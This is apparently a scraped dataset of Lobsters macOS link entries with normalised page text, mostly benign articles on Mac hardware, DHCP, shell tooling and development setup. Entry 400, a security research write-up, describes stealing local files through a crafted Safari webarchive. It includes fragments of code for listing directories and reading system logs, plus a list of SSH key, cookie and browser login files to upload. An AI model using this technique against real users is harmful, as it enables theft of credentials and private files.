machine would serve slow previously noted mac fast cache time increasing would improved performance sat dimm card rom precluded future upgrade video buffer actually composed dram chip private bus connected valkyrie video controller valkyrie could offload drawing cpu multiple io buffer cpu could move work instead waiting writes complete larger video buffer would slowed computer except obvious implication would cpu draw road apple light correction mac warrant called road apple worst mac ever come model based desktop model form factor expansion option low end mac praised quadra called one important mac flexible consumer mac ever made eighteen month introduced raised bar integer performance floating point performance doubling hard disk cdrom speed performas based comparable speed professional power mac released year prior excellent mac consumer market never used model based mhz frame reference evaluate real world performance relative benchmark still available online unlike benchmark score may accurately reflect performance benchmark stress emulation still help wonder relatively small issue grew legend time curious restore one see first hand impact smaller cache whatever performance motherboard blame apple mhz based performas deserve terrible reputation deserve lack mere kb onchip memory
399,Lobsters,mac,Apple macOS,"rMBP requires secret EFI magic to enable integrated GPU!, or why you probably don't want a Mac",https://www.youtube.com/watch?v=OLIVqCFLv5Y,rmbp requires secret efi magic enable integrated gpu probably nt want mac,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature apple retina macbok requires secret efi magic enable integrated gpu youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature apple retina macbok requires secret efi magic enable integrated gpu youtube
400,Lobsters,mac,Apple macOS,How to use a single download to remotely steal proprietary files from MacOS,https://lab.wallarm.com/hunting-the-files-34caa0c1496,use single download remotely steal proprietary file macos,let break process phase getting directory list predicting file path valuable information cooky tasty treat sneaking access user file getting loot get around repository,wallarm research imaging scary scenario open simple html document little proprietary file unbeknownst find way somebody else hard document source code ssh key file authorized user access gone impossible quite commonly used browser may actually allow scenario generally attack work something like user open html document browser browser read list file user access browser read key file uploads remote server run hacker process occurs background generally without alerting active user let break process phase phase getting information file current computer phase accessing file uploading external server first phase hacker need get list file generally easy task developer right mind allow html page request receive content directory file local desktop folder guessing trying possible path real option file path common sshidrsa directory varlogsystemlog different system assuming overcome obstacle second phase hacker need escape sandbox browser read file know upload server getting directory list unlike linux window macos interesting property directory get opened operating system creates specialized hidden file dsstore file keep information file browsing session including information size location file browsing window viewing property selected icon file created automatically mainly caching directory information quick easy access similar window thumbsdb dsstore keep file thumbnail unlike window also contains name file directory soon director opened dsstore created service file dsstore created automatically directory opened interestingly dsstore easily parsed get name file catalog example aptly name phython node dsstore would trick code example usrbinenv pythonfrom dsstore import dsstoreimport jsonpath usersusernamedsstore def parse file filelist file ifilename filelistappend ifilename return list set filelist ddsstoreopen path r fileresultparse print jsondumps fileresult name fileresult try dsstoreopen path name dsstore r fileresult parse allappend fileresult print jsondumps fileresult except pas let save file parsedsstorepy run result similar python parsedsstorepy document picture idm desktop music oraclejreusage public tmp parallel mega burpsuite downloads config cache application bashsessions creative cloud file pycharmprojects application parallel dropbox nextcloud trash script movie megasync downloads soft local ssh library pgadmin see retrieved file home directory mean information recursively call dsstore get complete hierarchy file computer without authorized access directory example applying approach home directory dsstore could get back backup soft picture ssh following backupsdsstore get next proceed source sql static couple note hacker need know name authorized system user file dsstore get created authorized user open directory system work predicting file path valuable information user worth stealing first foremost ssh directory key kingdom ok key encrypted system stored known file like following sshidrsa sshidrsakey sshidrsapub sshknownhosts sshauthorizedkeys also bashhistory get hacker complete history previously invoked command cooky tasty treat let look cooky firstly macos keep account data well known place librarycookiescookiesbinarycookies librarycookiescomapplesafaricookies cooky twitter skype standard application found place also gram list visited site returned hsts header librarycookieshstsplist another good find information system account top list let also get information application libraryapplication support example information stored login data cooky chrome browser nicely libraryapplication supportgooglechromedefaultlogin datalibraryapplication supportgooglechromedefaultcookieslibraryapplication supportgooglechromedefaulthistory inquisitive mind find information directory well could log ftp sql client messaging history login sneaking access user file know file valuable let try get access file safari know chrome browser reading local file straightforward way launch chrome special argument disablewebsecurity safari also warns work local file file one read file safari however file originally downloaded internet safari lot permissive towards kind request thus one send xhr request local file get back content file local get access knowing safari idiosyncrasy full path name load complete file content upload external server catch however get full file path without knowing authorized user name user name pretty come example etcpasswd contains login name work around snag check two log file generated operating system thanks varlogsystemlog varloginstalllog two file user name likely found loading simple browser applying regex get information need j function extract login name log function getuser var xhr new xmlhttprequest try xhropen get varlogsystemlog http false xhrsend return xhrresponsetextmatch userswg catch e xhropen get varloginstalllog http false xhrsend return xhrresponsetextmatch userswg getting loot hacker followed step first part article left get stolen file see would work put together simple backend receive path content file dsstore supplement path parsing bonus add black white list avoid uploading giant medium file specify file particular interest docx browser system mean html file get opened chrome opera hacker plan fall flat maybe forget xhtm extension web archive opened safari xhtm story pretty clear xmlbased web page built j webarchives bit complicated two supported format one easily faked manually xml version encoding doctype plist public appledtd plist http plist version dict key webmainresource key dict key webresourcedata key data data key webresourceframename key string string key webresourcemimetype key string texthtml string key webresourcetextencodingname key string string key webresourceurl key string file string dict dict plist data page line containing symbol get around default file internet execution protection warning fire mean file come email attachment unlikely execute good news hacker program set protection flag downloading file example telegram macos practice test able read user file malicious xhtm file transmitted via desktop version telegram macos even without archiving password protection practice test file transmitted telegram worked one example similar scenario also possible example ready file easily given victim usb dongle family picture play project get readymade html file backend repository time safari user anything apparently apple consider issue security breach heard planned patch address one thing vigilant careful file download internet thing use safari browser paranoid mean
401,Lobsters,mac,Apple macOS,Insta Cloning,https://medium.com/@NikitaVoloboev/insta-cloning-ff5f38eb1d32,insta cloning,keyboard maestro alfred check vítor galvão,really cool thing started use abuse latelyi use keyboard maestro alfred make happenthe idea simple found cool github repo want check code comfort text editor make happen two clicksi folder named srcclones home directory clone different repos like hack created macro keyboard maestro look like find macro quickly make yourselfit simple line tell application safari return url front documenttakes current url browser safari put url system clipboard use chrome browser check change line suit browserthen simply cd srcclones folder git clone url folderawesome make even amazing could instantly open newly cloned repo favorite editori made another macro look also similar macro open cloned repo sublime text instead v code find sublime much faster use many casesaside km macro also use awesome workflow vítor galvão let watch folder present file folder alfred original workflow watch downloads modified watch folder like folder clone thing inside srcclones modified workflowand action scan srcclones dir press return folder open v code press open sublime press open itermso together find cool repo press button run km macro clone repo preferred folder start hacking away immediately
402,Lobsters,mac,Apple macOS,"Rapid DHCP: Or, how do Macs get on the network so fast? (2011)",https://cafbit.com/post/rapid_dhcp_or_how_do/,rapid dhcp mac get network fast,update july mt mentioned hacker news update july mt rfc detecting network attachment update july mt posted summary discussion,one life minor annoyance wait device connect network wake sleep often open lid eeepc netbook enter web address get dreaded webpage available message machine still working connecting wifi network occasion twiddle thumb long second network ready used frustrating thing know nt way know mac open lid macbook pro connects network nearly instantaneously fact matter fast network come even try load web page curiosity got better set investigate mac able connect network quickly network connect time operating system could improved figure three main category timeconsuming activity occur network initialization link establishment activity establishing communication network link layer case wifi radio must powered access point detected optional encryption layer eg wpa established link establishment device able send receive ethernet frame network dynamic host configuration protocol dhcp dhcp handshaking device negotiates ip address use local ip network dhcp server responsible managing ip address available use network miscellaneous overhead operating system may perform number mundane task process network initialization including running script looking preconfigured network setting local database launching program etc investigation thus far primarily concerned dhcp phase although two category would interesting study future set packet capture environment spare wireless access point observed network activity number device initialized network connection worstcase scenario let look network activity captured android tablet connecting samsung galaxy tab time second direction packet description rnr link established request client request ip address previously connected network request client request ip address discover okay give maybe different network dhcp server offer server offer ip address client request client accepts offered ip address ack server acknowledges client acceptance ip address tablet presumably interest optimization initially skipping dhcp discovery phase immediately requesting previous ip address problem different network dhcp server ignores request second tablet stubbornly try request old ip address another second resigns starting scratch performs dhcp discovery needed obtain ip address new network process took whopping second complete note would faster dhcp server configured send naks update simmons fairness delay would nt bad device connecting network previously using however notice tablet wait full second link establishment even think starting dhcp process engineering snappiness usually mean finding lot small opportunity save millisecond someone definitely dropped ball contrast let look packet dump machine lightningfast network initialization see uncover magic happening hood macbook pro macos time second direction packet description rnr link established request broadcast whohas client validating linklocal address request unicast whohas tell request unicast whohas tell reply unicast dhcp server isat request unicast whohas tell request broadcast whohas tell broadcast whohas tell broadcast whohas tell reply unicast isat router port airport detection implies ip interface configured normal ip activity newly configured interface request ack key understanding magic first three unicast arp request look like mac o remembers certain information last connected network last several network particular must least persist following tuple network ethernet address dhcp server ip address dhcp server ip address assigned dhcp server network initialization mac transmits carefully crafted unicast arp request stored information network memory attempt send request specific ethernet address dhcp server network asks server ip address request server reply ip address mac formerly using network unless network host radically shuffled around one arp request result request corresponding current network current network happens one remembered network network recognition technique allows mac rapidly discover connected known network network recognized presumably mac know dhcp lease still active immediately presumptuously configures ip interface address know good network well perform selfarp good measure nt seem wait response dhcp handshaking process begin background sending dhcp request assumed ip address network interface available use handshaking process network recognized assume mac would know begin dhcp discovery phase instead sending blind request former ip address galaxy tab mac rapid network initialization credited network recognition scheme judging use arp problematic deal userspace unusually regular transmission interval reliable delay packet sent guessing mac dhcp client system entirely implemented tight kernelmode code mac began ip interface initialization process mere link establishment far faster device tested android device galaxy tab rely usermode dhclient system part dhcpcd package dhcpcd program doubt brings lot additional overhead loading program context switching perhaps even running script next step daring kernel hacker implement similarly aggressive dhcp client system linux kernel enjoy fast signon speed android tablet android phone ubuntu netbook already exists minimal dhcp client implementation linux kernel lack certain feature configuring dns nameservers perhaps would nt much work extend code support network recognition interface usermode daemon handle auxillary configuration information received via dhcp ever get spare cycle maybe even take stab update july mt post mentioned hacker news lot lively discussion comment people pointed disadvantage putting fullfeatured dhcp client kernel skeptical putting dhcp client kernel however nt want elaborate since post getting way lengthy known would subject peer review might bit careful word argument putting dhcp client kernel basically boil achieving speed shaving millisecond ca nt launch program wait dynamically link load config file etc get response time mac link establishment transmitting first dhcp packet told dhcpcd program persistent daemon maybe launch overhead nt something keeping linux host response time arp trick could awkward userspace need use raw socket interface transmitting nt big deal use something like packet interface sniff incoming packet observe arp reply nt played around packet interface sure pro con might neither showstopper improved usermode dhcp client thinking time think would certainly start usermode solution since carefully crafted daemon able achieve comparable response time arping program nt seem problem using packet send receive arp packet userspace update july mt thanks macfaden pointing comment scheme basically implementation rfc detecting network attachment coauthored apple employee update july mt thanks steinar h gunderson pointing comment dhcp server test network incorrectly configured since using mostly box dhcpd configuration ubunbtu linux nt set authoritative default nt promptly sending naks response galaxy tab request old ip address fixing problem dhcp server galaxy tab dhcp handshake happens quite bit faster although still time slower mac revised chart network activity galaxy tab samsung galaxy tab revised time second direction packet description rnr link established request client request ip address previously connected network nak server decline allow network discover offer server offer ip address client request client accepts offered ip address ack server acknowledges client acceptance ip address time line see nonmac device nontest dhcp plus bit time link initialization enough frequently get connection error web browser need find way shave emerging consumer electronics device consumer conditioned think pc something wait expect nonpc network device behave like light switch posted summary discussion another entry
403,Lobsters,mac,Apple macOS,Pascal at Apple,http://blog.fogus.me/2017/07/20/pascal-at-apple/,pascal apple,http rough timeline,jul lately reading old computing paper article journal magazine memo tweeting work way recent exploration apple internal memo history apple involvement pascal memo cursory provide interesting snapshot history pascal within company http find tweet thread spurred post rough timeline wirth compiler ucsd pascal lisa pascal mpw pascal clascal object pascal
404,Lobsters,mac,Apple macOS,Soft U2F,https://githubengineering.com/soft-u2f/,soft,click redirected,click redirected
405,Lobsters,mac,Apple macOS,DBHist: bash history in sqlite,https://www.outcoldman.com/en/archive/2017/07/19/dbhist/,dbhist bash history sqlite,gist johan carlquist homebrewdbhist create maintain tap gistgithubcom,jul sqlite bash terminalapp term spend lot time terminal never productive started use dbhist probably know several way search bash history way controlr history grep foo limitation issue grep always hassle write posix compatible regexp like always get digit want mention often bash corrupts unexpectedly override history file use one session also remember time kept huge cheatsheets various command main problem approach needed another cheatsheet remember one become outdated quickly first one decided use sqlite storing bash history seen mentionin web found good implementation could find anything liked written python additional dependency zsh nice shell used decided stay default dependency package manager library bash script really wanted something simple something could put dotfiles repo modify need end wrote implementation find gist also embedded one requirement set histtimeformat tell bash store command history time unixtime format source file update thanks johan carlquist homebrew formula homebrewdbhist see create maintain tap installation instruction verified work bash default macos get help start searching history import current bash history surprised give much beginning type show result current session want search across session dbhist git status git status typed git status type time started use dbhist show last time typed second column first column incremental id last saved command see often pushed current git repository invoke command folder dbhist git push git push case mean show command executed current folder subfolder also find command executed current folder example show last command executed home folder dbhist limit cd cd dotfiles cd dev l brew upgrade useful feature example remember invalidate cloudfront distribution use aws tool remember command word invalidation dbhist start aws invalidation aws cloudfront createinvalidation distributionid path aws cloudfront createinvalidation help aws cloudfront getinvalidation distributionid id aws cloudfront createinvalidation distributionid aws cloudfront listinvalidations distributionid sql syntax similar globbing pattern wildcards parameter start tell search command start aws default dbhist search pattern query mean query anywhere hope also find useful listing dbhistsh also find gistgithubcom mit license spdx short identifier mit resource mit license copyright denis gladkikh http permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software use source file source dbhistsh verified work bash configuration dbhistorytrue use false disable dbhistoryfile homedbhist location dbhist file make work keep next configuration bash important time format make unixtime histsize homebashhistory histtimeformat histcontrolignorespace erasedups detail http use sourced file dbhist help dbhistory true kind session id allows see command executed terminal session dbhistsalt random allows u verify existence dbhist file dbhistinitializedfalse keep previous folder keep pwd command like cd dbhistoldpwd oldpwd get location dbhist file default location homedbhist dbhistfile echo dbhistoryfile homedbhist execute command sqlite dbhist file dbhistsqlite dbhistfile initialize dbhist file create table dbhistinit f dbhistfile local sqlcreate table history id integer primary key autoincrement histid integer cmd text epoch integer ppid integer pwd text salt integer echo sql dbhistsqlite fi execute bash prompt dbhistprompt dbhistinitialized dbhistinit dbhistinitializedtrue return fi n compline return fi local formatedhistory local num local epoch local pwd pwd oldpwd dbhistoldpwd pwd oldpwd dbhistoldpwd oldpwd fi history formatedhistory history sed e space digit space digit space num echo formatedhistory sed e epoch echo formatedhistory sed e command echo formatedhistory sed e dbhistsqlite end insert history histid epoch cmd ppid pwd salt value num epoch command ppid pwd dbhistsalt end use dbhist help learn tool dbhist local local allfalse local selffalse local startsfalse local verbosefalse local query local location local pwdfalse eq z case shell dbhistsqlite return help cat end usage dbhist option query option limit number number latest command show default include history session current self include history dbhist start match command start query verbose verbose output show sql reduce search current pwd reduce search current pwd pwd show working directory cmd shell access shell end return limit shift limit option require value limit echo limit number return fi alltrue self selftrue start startstrue verbose verbosetrue n location echo specifier pwd already set return fi location n location echo specifier pwd already set return fi location pwd pwdtrue echo unknown option return n query echo specify one query return fi query requires value esac shift done pwdq pwd pwdqpwd fi local sql select substr max id datetime max epoch unixepoch localtime substr count pwdq cmd history sql salt dbhistsalt ppid ppid fi self sql cmd dbhist cmd like dbhist fi n query query query start query query query fi query query fi sql cmd like query escape fi pwdl pwd case location sql pwd pwdl pwdl pwdl pwdl pwdl sql pwd like pwdl escape esac sql group cmd pwd sql pwd fi sql order max id desc limit limit verbose echo database dbhistfile echo sql echo sql fi echo sql dbhistsqlite inject dbhistprompt promptcommand promptcommand dbhistprompt promptcommand dbhistprompt promptcommand promptcommand fi fi
406,Lobsters,mac,Apple macOS,Red Programming Language 0.6.3: macOS GUI support,http://www.red-lang.org/2017/07/063-macos-gui-backend.html,red programming language macos gui support,issue backend previous article vector graphic reactive programming frp dsl dsl station f tiger demo vid guideline button ordering capitalization chat room mailinglist iso unit test iso week huge job documenting binding julia gui system libred documentation backend travis ci test script example parse dialect redsystem passed returned stackoverflow question pull request,new red release contains commits close issue brings large number new feature main one official support macos gui new backend view engine reader familiar gui system get quick overview previous article nutshell dynamicallybuilt reactive object tree pluggable backends full support window prototype gtk android full vector graphic support large subset svg direct reactive programming support frp style declarative dsl gui building layout management declarative dsl graphic macos backend support feature window backend except following yet implemented fillpen pattern fillpen bitmap diamond gradient draw matrix transformation pen fillpen draw gui console macos available branch part release view module though compiled cli console default macos showstopper short example starting gui hello world view text hello mac world tiny demo script hopefully get u office station f right view text french touch ontime move ttext tail ttext base draw pen fillpen blue box fillpen white box fillpen red box return button start trate small reactive text size measuring tool one test script view style txt text right txt text f area font name comic sans m size color black return txt size pixel text react ftext ffont facetext form sizetext f return txt font name droplist data arial consolas comic sans m time react ffontname pick facedata faceselected return txt font size field react ffontsize sdata button bold sdata sdata button bold sdata max sdata return generating macos bundle apps made simple toolchain use macos target compiling example using svg tiger demo red desktop macos tigerred produce tigerapp bundle desktop crossplatform gui metric order cope different ui guideline across gui platform release also introduces experimental ruleoriented gui rewriting engine capable modifying face tree dynamically according preset rule integrated last stage vid visual interface dialect processing currently implemented rule perplatform general crossplatform rule also planned window rule colorbackgrounds color background colorless face match parent color colortabpanelchildren like colorbackgrounds tabpanel specific okcancel button ordering rule put canceldeleteremove button last macos rule adjustbuttons use standard button subclass button narrow enough capitalize capitalize widget text according macos guideline cancelok button ordering rule put oksaveapply button last give quick grasp feature matter capable simple example leverage button ordering capitalization rule view text name right field return text age right field return button ok button cancel see sidebyside macos window generated form notice button text ordering yes differ source code gui rule ensured button ordered according platform guideline ok last macos cancel last window button label properly capitalized macos small example demonstrates concept actually limit much could alter ui far could go postprocessing still experimental cause trouble easily disable using systemviewvidguirulesactive also remove rule selectively modifying content following list systemviewvidguirulesoswindows colorbackgrounds colortabpanelchildren okcancel systemviewvidguirulesosmacos adjustbuttons capitalize cancelok allows total control needed also help conform ui guideline effort saving everyone time tweak code platform write new platform added wo nt change code support world getting one detail wrong may keep app store prevent certified app huge also possible use rule engine write guideline linter could get report rule applied vid code platform report nt mean text listing could highlight element ui processed rule system help great system tell helped even better ton possible rule could implement idea great one please let u know joining u online chat room gitter prefer posting mailinglist change core language biggest addition core language release date datatype support rebols date datatype feature addition include support large range iso date format unit test written far full documentation available example accepted input format math operation fully supported dmonth dmonth dyearday random sort random red also add three new accessors timezone change zone adjusts time accordingly utcinvariant week getssets week year starting sunday isoweek getssets iso week year starting monday conversion tofrom unix epoch time also builtin tointeger tointeger todate core addition new function added existing simple io api delete deletes file empty folder size return size byte file native accepts url argument example http rawgithubusercontentcomredcodemastershowcaseeveclockred runtime error report include compact call stack trace foo bar foo bar math error attempt divide zero stack bar foo set new function diskcached remote file access available dothru existsthru loadthru readthru paththru work way normal counterpart except retrieved file cached locally next access locally cached copy used system object extended systemoptionscache point cache folder used red toolchain systemoptionsthrucache point cache folder used thru function systemcatalogaccessors path accessors available per datatype browse native work macos open default browser given url rudolf meijer huge job gathering currently implemented rule math operation mixed datatypes resulted documenting improving rule better defining resulting datatype math operation change fully operational return current date time wait accepts time value argument improved make url construction spec argument block autodetect older intel cpu window platform building console even odd support time value argument r compiler output function address map verbosity improved min max native support pair tuple minmax applied per dimension pair tuple work number second argument compilation option force release mode anymore target o source file name displayed syntax error compiletime libred libred improved thanks work joaquim libred binding julia language providing julia full power red native gui system several new function added libred api redbinary construct binary value external byte array redimage construct image value various possible external byte array redgetfield get value object word redsetfield set value object word info libred documentation libred robustness also vastly improved libred api function catch null pointer argument even invalid pointer passed libred api situation libred return red error value view engine addition macos backend new test backend included release backend work simulating gui backend testing purpose still experimental work fine far able write whole suite unit test view engine vid dialect run headless linux server like travis ci way backend enables red user unit test gui apps minimal effort though tooling top current backend welcome working principle simple use viewnowait produce gui without starting event loop form test using following model set focus face want simulate event using setfocus trigger event using doevent test result event conforms expectation extract short test script viewnowait hello button hello print ok name field setfocus hello doevent click setfocus name doeventwith key doeventwith key doeventwith key enter probe nametext probe namedata using test backend requires setting option header see linked script header compilation release mode another notable addition foreachface function power gui rewriting rule engine allows easy traversal face tree depthfirst selecting face need process syntax foreachface root action foreachfacewith root action condition root root face tree action action perform matched face condition optional condition selecting face first version applies action block face second one select face matching condition block need return true value act current face action condition block implicit face word defined refers current face tree example testsvidred collect foreachfacewith win keep facetext find facetext return china panel option option option option sophisticated example using foreachface dynamically localize label adjust button size position accordingly fit text nicely langs english french 中文 label name age phone cancel submit nom age tél abandon envoyer 名字 年龄 电话 取消 提交 setlang function f event root fparent condition facetext facetype droplist list collect foreachfacewith root keep facetext condition forall list append clear label fselected index list foreachfacewith root pad metric total face padding x prev facesizex facesizex pad first sizetext face faceoffsetx faceoffsetx prev facesizex facetype button view style txt text right droplist data langs select onchange setlang return groupbox txt name field return txt age field return txt phone field return pad button cancel button submit also detect window resizing event use current window size resize position face dynamically also possible change mouse cursor shape using predefined value setting custom image faceoptionscursor using cursor keyword vid followed image value one following keywords arrow ibeam hand cross example change litwords accepted flag facet block new shape dialect command close changed default background color white tabpanel window added systemviewmetrics used mostly vid accurate sizingpositioning added accelerated option face set true fastersmoother face rendering base face zordering honored accelerated face button focus pressing enter key trigger click event renamed enable facet correct enabled new function setfocus set focus given face important gui testing new class option faceoptions allows setting subclass native control textlist accepts data keyword anystring value input let feed list value vid example view textlist data parse read http apigithubcomreposredredevents collect thru message skip keep n script single expression using two dsl let meditate vid dialect vid received many enhancement significant accurate sizing positioning native widget using o metric addition alignment control extending acrossbelow layout mode possible add optional alignment keywords two linear layout mode across top middle bottom left center right keywords also follow return command changing alignment mode next rowcolumn required default top left short example view style chk check option data yes style vline base red across top vline button ok text text field chk return across middle vline button ok text text field chk return across bottom vline button ok text text field chk change new oncreated event triggered face shown first time new strike option face set strikethrough font style new init body styling option allows define block code run style instantiated later option added react keyword allows data keyword argument arbitrary red expression see textlist example robust face option parsing default actor text widget ondown vid save style name face faceoptionsstyle parse dialect new case command added parse dialect case temporarily change case matching mode next rule syntax case mode rule mode true casesensitive matching false caseinsensitive logic word rule rule local case matching mode applied redsystem dialect newcomer redsystem red builtin system programming dialect offering redlike syntax clevel semantics many improvement c like namespaces exception rtti release brings important improvement structure passed returned value internal external function call also inlined structure achieved putting value keyword struct type declaration name struct field value passing structs value sadly formally specified c language resulting incompatible compilerspecific abis moreover abis documented partially gathering right information painful time consuming illustrate bad situation spending day researching various c compiler abi able answer stackoverflow question returning c structs value left unanswered year might write synthetic article c abis someday note could find documentation online anyway hard work done redsystem implement common abi platform window microsoft visual c abi linux gccclang abi support armspecific abi macos clang abi addition stackoriented feature supported new use feature allows create local variable anywhere function body useful splitting long function creating local variable macro arm backend also enhanced significantly new release fix improvement soft integer division routine fix nonpassing unit test float better aapcs conformity various bug fix improved accuracy overflow detection multiplication console ansi escaping sequence supported red cli console thanks oldes see pull request info screenshot console change improved autocompletion completes longest common substring autodetect older intel cpu window platform building console systemconsolesize provides size console column row next version mostly focus gui console bringing macos also extending greatly merged master branch next day new gui console almost finished version android already worked separate private repo merge redred public repo ready need control pr timing android release big one unlike seen far meantime usual enjoy fun
407,Lobsters,mac,Apple macOS,Building the XNU kernel on Mac OS X Sierra (10.12.X),http://0xcc.re/building-xnu-kernel-macosx-sierrra-10-12-x/,building xnu kernel mac o x sierra,post via r,post apr oct sep apr apr aug jul jun subscribe via r
408,Lobsters,mac,Apple macOS,Setup EFI Development environment on Mac OSX Sierra (10.12.X),http://0xcc.re/setup-efi-development-environment-on-mac-osx-sierra-10-12-x/,setup efi development environment mac osx sierra,post via r,post apr oct sep apr apr aug jul jun subscribe via r
410,Lobsters,mac,Apple macOS,How to make Touch Bar actually useful for web developer,http://nerdblog.pl/post/162620007204/how-to-make-touch-bar-actually-useful-for-web,make touch bar actually useful web developer,decent human spare extra buck buy universal nice looking way adding custom hack script available gist written way work system ruby codeship logo bitbarwebpackstatusplugin judging amount code double someone work tiny script,new macbooks touch bar released struggling new touch bar pretty useless flow kept accidentally touching action key missed good ol esc half year barely anything changed area application use daily either support touch bar add gimmicky button cross todo task called support latest mbp situation sucked wanted something finally found way howeverything blog post possible great tool called bettertouchtool amazing piece software author decent human spare extra buck buy even support fellow developer connection person paid advertisement paid advertisement blog two thing done make touch bar bit better idea generic enough anyone modify suit need added webpack codeship button show status development build ci testswe going begin configuring btt make take touch bar replace menu installing btt open go gesture touch bar click general touch bar setting configure like completely replace touch bar make btt control systemwide might tempted leave show macos control strip checked cause ugly close button show left side esc moving key right screwing muscle memory ok sure go ahead personally driving crazy ready create first widget unfortunately since touch bar support new selection widget really limited wish universal nice looking way adding custom hack since going use run apple script show return value biddingfor starter going need simple script ping codeship return status since really enjoy writing applescript decided sidestep problem writing ruby script instead script available gist written way work system ruby also pretty straightforward set copy everything file hard drive insert api key line simple caching make sure hitting codeship server need toafter configured dropped script somewhere home directory need configure properly btt go back touch bar section gesture click widget select previously mentioned run apple script show return value click advanced configuration name type anything might codeship copy script return shell script usrbinruby usersmecodeshiprb wherever put script set script execute every also add codeship logo set alternate color right result type failed regex set icon color wishand like mentioned general idea simple used technique add webpack status well first installed bitbarwebpackstatusplugin could written judging amount code double someone work wrote tiny script translates human readable message voila let know find good tip hack could applied comment
411,Lobsters,mac,Apple macOS,Guide to Local WordPress Development,https://www.davidgagne.net/2017/01/23/the-ultimate-guide-to-local-wordpress-development-on-a-mac/,guide local wordpress development,local setup perfect web development environment new mac mysql terminalapp wordpress install plugins locally wordpresstest github setup github desktop github clone download dreamhost simple php git deploy script random key generator dreamhost vi idrsapub wrapping boom bonus point selectively assign permission branch slack httpdvhostsconf httpdvhostsconf resource related post navigation,bold title know working achieve five year finally satisfied configuration looking work wordpress theme plugins local machine manage code base github effortlessly deploy update come right place local setup first thing need upgrade mac o x sierra else going problem left right already done though developer developer like live stale operating system need follow chris mallinson excellent tutorial perfect web development environment new mac going rehash whole article great job skip bit end implementing custom home page want really important already method navigating file system use coda ide handle organizing project screwing httpdconf file year tricky part chris instruction getting httpdconf file right may get lucky everything work perfectly following rule lucky make several change probably screwing httpdconf file year contact happy send copy httpdconf httpdvhostsconf probably work machine keep archive icloud drive folder use exact configuration multiple machine two mac mini desktop macbook air issue installed mysql locally need make sure ability actually use terminalapp friend usrlocalmysqlbinmysqladmin u root ptemppassword password newpassword create database use wordpress always name mine wordpress name anything really code temppassword mysql install gave root probably annoyingly complex enough use one newpassword change want gotten working ready start really cooking download copy wordpress unzip drop siteswordpress first going run permission issue probably handle sudo chown r www siteswordpress sudo chmod r gw siteswordpress need make sure install plugins locally adding line wpconfigphp script define fsmethod direct point able hit wordpresstest browser start wordpress installation process know tempting use localhost database host stick database name going database added mysql minute ago github setup okay wordpress running locally edit theme plugins without worrying taking production website hack time get serious github desktop yet grab install crazy person everything via cli idea even reading since probably know already let work theme development first create new github repository initialize readme assume named repo skywalker awesome person awesome people whether make public private click big green clone download button choose open desktop going save skywalker siteswordpresswpcontentthemesskywalker take zillionth second empty repo right okay edit theme anything dramatic drop stylecss file add title get started save switch github desktop app show file changed ready commit commit yet getting cool part anything else ssh web server ssh web server luck really continue able ssh web server though tell need shell access else going switch different host recommend dreamhost sshed server make sure git installed running git web server git running guess need better web host good go okay moving right along download marko marković simple php git deploy script update config script get value secretaccesstoken handy random key generator know want use one strong fort knox password key need used querystring variable save headache use one codeigniter encryption key instead working wordpress theme government bank jump hoop make fort knox safe otherwise worried someone hacking local pizza place website cracking code update remoterepository going look like http githubcomyourgithubusernameskywalkergit leave branch set master rolling eye know want use different branch go nut supposed tutorial beginner targetdir going depend web host give much direction use dreamhost wordpress running root domain probably look like homedreamhostusernameyourwebsitecomwpcontentthemesskywalker need ftp better sftp two file web server somewhere matter long accessible outside world also need content public ssh key usually idrsapub web server ssh server run generate key way get one web host sshkeygen rsa likely drop idrsapub ssh folder use vi get need copy content still sshed web server try ssh github make sure need authorize web server connect github run command ssh git githubcom get response saying something along line worked confusing okay work going need talk someone web host github figure server talk github assume work move next step go back github click repository setting tab get deploy key panel going add content idrsapub file created deploy key name whatever want far tell name matter one snafu though use single deploy key single repository want work two separate theme server need either generate new user server one generate new ssh key user need drop entire wpcontent directory repo recommend going deal gitignoring ton file since wordpress medium uploads plugins folder switch webhooks panel add new webhook payload url full path deployphp script uploaded along querystring containing secretaccesstoken added deployconfigphp script append satsecretaccesstoken file content type applicationjson webhooks set send everything although limit push event want minimize frequently get pinged yes want make active done click green add webhook button github send test ping web server deployphp script tell result right wrapping everything gone smoothly point able switch back github desktop app run commit mine set always commit sync edit check automatically sync committing option commit file pushed github trigger webhook call deploy script pull file repo push web server boom new skywalker theme production cool bonus point different webhooks different branch repository let say three branch dev beta master web server would deploydevphp deploybetaphp deployphp unique secretaccesstoken hitting unique config file different targetdir updating appropriate folder since selectively assign permission branch assuming organization github account mean could developer working dev branch allowed push dev folder make dev folder serve dev subdomain worry developer accidentally pushing something production use slack configure different webhook send message slack channel time someone commits handy working big project httpdvhostsconf promise work perfectly situation content httpdvhostsconf file stripped comment updated april directory usersyourusernamesites option index multiviews followsymlinks allowoverride order allow deny allow directory virtualhost virtualdocumentroot usersyourusernamesites servername hometest usecanonicalname virtualhost virtualhost virtualdocumentroot usersyourusernamesites servername sitestest serveralias test usecanonicalname virtualhost virtualhost virtualdocumentroot wwwsites servername xip serveralias xipio usecanonicalname virtualhost resource related post navigation
412,Lobsters,mac,Apple macOS,macOS High Sierra tech preview: A quick look at the stuff you can’t see,https://arstechnica.com/apple/2017/06/macos-high-sierra-tech-preview-a-quick-look-at-the-stuff-you-cant-see/,macos high sierra tech preview quick look stuff see,enlarge apfs,enlarge high sierra default desktop wallpaper even standard recent macos release year high sierra shaping lowkey release highprofile uservisible improvement apple highlight page cover quite thing case iterative tweak would mostly belong grab bag section overview say leopard even yosemite get wrong looking forward icloudbacked imessages family icloud storage plan support table note flight status update spotlight exactly life changing unless life continuously interrupted extremely small specific problem call high sierra minor release ignore big underthecovers change brings mac work year new filesystems graphic apis may hard demo casual user plenty release lay foundation visible change somewhere line lieu traditional preview high sierra browsed dev doc talked apple get detail update foundational change apfs longtime follower ar technica macos review know new filesystem long time coming current hf three decade old showing age despite feature apple bolted onto year like io high sierra convert boot drive apfs first install true mac run high sierra regardless whether equipped ssd spinning hdd fusion drive setup current beta installer given option uncheck apfs box checked default start install process though necessarily guarantee survive final version also clear point edge ssds automatically converted assuming people stick default people crack mac open mac user upgrade going get new filesystem prefer cautious thing apple tell u hf going anywhere anytime soon high sierra continue boot hf partition 